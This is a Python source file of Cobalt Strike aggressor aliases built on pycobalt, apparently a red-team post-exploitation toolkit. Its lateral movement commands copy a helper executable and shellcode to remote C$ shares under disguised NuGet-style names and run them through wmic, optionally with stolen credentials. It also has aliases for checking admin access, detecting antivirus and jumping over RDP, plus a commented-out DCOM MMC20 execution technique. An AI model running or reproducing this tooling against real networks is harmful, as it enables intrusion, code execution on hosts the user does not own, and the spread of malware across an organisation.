#!/usr/bin/env python3

import sys
import utils
sys.path.insert(0, utils.basedir('pycobalt'))

import textwrap

import pycobalt.engine as engine
import pycobalt.events as events
import pycobalt.commands as commands
import pycobalt.aliases as aliases
import pycobalt.aggressor as aggressor
import pycobalt.callbacks as callbacks
import pycobalt.helpers as helpers
import pycobalt.utils

# see https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
# TODO finish this, using our js payload stuff
@aliases.alias('dcom', 'Move laterally using DCOM')
def _(bid, target, listener=None):
    def do_dcom(listener):
        if not aggressor.listener_info(listener):
            aggressor.berror(bid, "Listener {} does not exist".format(listener))
            return

        aggressor.btask(bid, 'Tasked Beacon to spawn beacon on host "{}" for listener {} using DCOM'.format(target, listener))

    if listener:
        do_dcom(listener)
    else:
        # choose listener
        aggressor.openPayloadHelper(do_dcom)

#    # generate a powershell one-liner to run our alias	
#    $command = powershell($3, true, 'x86')
#
#    # remove "powershell.exe " from our command
#    $command = strrep($command, "powershell.exe ", "")
#
#    # build script that uses DCOM to invoke ExecuteShellCommand on MMC20.Application object
#    script  = '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "'
#    script .= target
#    script .=  '")).Document.ActiveView.ExecuteShellCommand("'
#    script .= 'c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe'
#    script .= '", $null, "'
#    script .= $command
#    script .= '", "7")'
#
#    # run the script we built up
#    aggressor.bpowershell(bid, script)
#    
#    # complete staging process (for bind_pipe listeners)
#    aggressor.bstage(bid, target, listener, 'x86')

@aliases.alias('checkaccess', "Check to see if beacon has remote admin access to a host (requires host to have C$ share available)")
def _(bid, *hosts):
    command = ''

    if not hosts:
        aggressor.berror(bid, 'Specify some hosts to check admin access to')

    for host in hosts:
        host = host.lstrip('\\')
        command += helpers.code_string(r"""
            ls \\{host}\C$ >$null 2>$null
            if ($?) {{
                Write-Output "You have admin access to \\{host}"
            }} else {{
                Write-Output "You do not have access to \\{host}: $($Error[0].Exception.Message)"
            }}
            """, host=host)

    aggressor.btask(bid, 'Tasked beacon to check access to: ' + ', '.join(hosts))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('checkav', "Check for AV with virtual SID resolution")
def _(bid, *hosts):
    exe = '/share/tools/post_exploitation/TestAntivirus/bin/Release/net35/TestAntivirus.exe'

    if hosts:
        aggressor.btask(bid, 'Tasked beacon to check AV on: ' + ', '.join(hosts))
    else:
        aggressor.btask(bid, 'Tasked beacon to check local AV')

    aggressor.bexecute_assembly(bid, exe, helpers.eaq(hosts), silent=True)

def lateral_wmi_shellcode(bid, host, shellcode, user=None, password=None):
    native_helper = utils.basedir('tools/native.exe')

    temp_relative = 'WINDOWS'
    temp_remote = r'\\{}\C$\{}'.format(host, temp_relative)
    temp_local = r'C:\{}'.format(temp_relative)

    native_helper_relative = 'NugetPackage.{}.exe'.format(helpers.randstr())
    native_helper_remote = r'{}\{}'.format(temp_remote, native_helper_relative)
    native_helper_local = r'{}\{}'.format(temp_local, native_helper_relative)

    shellcode_relative = r'nuget.{}.package'.format(helpers.randstr())
    shellcode_remote = r'{}\{}'.format(temp_remote, shellcode_relative)
    shellcode_local = r'{}\{}'.format(temp_local, shellcode_relative)

    # upload
    helpers.upload_to(bid, native_helper, native_helper_remote, silent=True)
    helpers.upload_to(bid, shellcode, shellcode_remote, silent=True)

    # call it
    remote_command = '{} {}'.format(native_helper_local, shellcode_local)
    # TODO user/pass
    local_command = 'echo "{host}" & wmic /node:"{host}" '.format(host=host)
    if user or password:
        local_command += ' /user:{user} /password:{password} '.format(user=user, password=password)
    local_command += 'process call create "{command}","{cwd}"'.format(host=host, command=remote_command, cwd=temp_local)
    aggressor.bshell(bid, local_command)

    # clean up
    #aggressor.brm(bid, shellcode_remote, silent=True)

@aliases.alias('wmi-shellcode', 'Move laterally with WMI, shellcode, and a .exe helper')
def _(bid, shellcode, *hosts):
    if not hosts:
        aggressor.berror(bid, 'specify some hosts')
        return

    for host in hosts:
        lateral_wmi_shellcode(bid, host, shellcode)

@aliases.alias('wmi-creds-shellcode', 'Move laterally with user/pass WMI, shellcode, and a .exe helper')
def _(bid, user, password, shellcode, *hosts):
    for host in hosts:
        lateral_wmi_shellcode(bid, host, shellcode, user=user, password=password)

@aliases.alias('lateral', 'Run lateral movement commands')
def _(bid, method, host, *args):
    callbacks = {
                    'wmi-shellcode': lateral_wmi_shellcode,
                }

    if method in callbacks:
        aggressor.btask(bid, 'Tasked beacon to move laterally with method: {}'.format(method))
        callback = callbacks[method]

        if not pycobalt.utils.check_args(callback, (bid, host) + args):
            signature = pycobalt.utils.signature(callback, trim=2)
            aggressor.berror(bid, 'Invalid arguments to method {}. Signature: {}'.format(method, signature))
            return

        host = host.lstrip('\\')
        callback(bid, host, *args)
    else:
        aggressor.berror(bid, 'method must be one of: {}'.format(', '.join(callbacks.keys())))

def get_names(bid, hosts, delay=10):
    """
    Get names for hosts using wmic.

    :param bid: Beacon to run on
    :param hosts: Hosts to resolve
    """

    command = ''

    for host in hosts:
        host = host.lstrip('\\')
        command += helpers.code_string(r"""
            $hostname = wmic /node:`"{host}`" computersystem get name 2>$null | Select-Object -Skip 2
            if ($?) {{
                Write-Host "{host}: $hostname" -NoNewLine
            }} else {{
                Write-Host "Failed to check {host}: $($Error[0].Exception.Message | findstr 'Description =')"
            }}

            Sleep {delay}
            """.format(host=host, delay=delay))

    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('names', 'Show hostnames of computers with wmic')
def _(bid, *hosts):
    aggressor.btask(bid, 'Tasked beacon to get hostnames for: {}'.format(', '.join(hosts)))
    get_names(bid, hosts)

@aliases.alias('names-file', 'Show hostnames of computers from file with wmic')
def _(bid, fname):
    with open(fname, 'r') as fp:
        hosts = [host.strip() for host in fp]

    aggressor.btask(bid, 'Tasked beacon to get hostnames for {} machines'.format(len(hosts)))
    get_names(bid, hosts)

@aliases.alias('rdp-jump', 'Jump with RDP')
def _(bid):
    aggressor.bexecute_assembly(bid, '/share/tools/jumper/jumper_tsclient.exe', 'tsclient-embedded')

@aliases.alias('access-policy', 'Get GPO remote access policy')
def _(bid, *args):
    external.run(bid, 'powerview', 'Get-DomainGPORemoteAccessPolicy {}'.format(' '.join(args)))
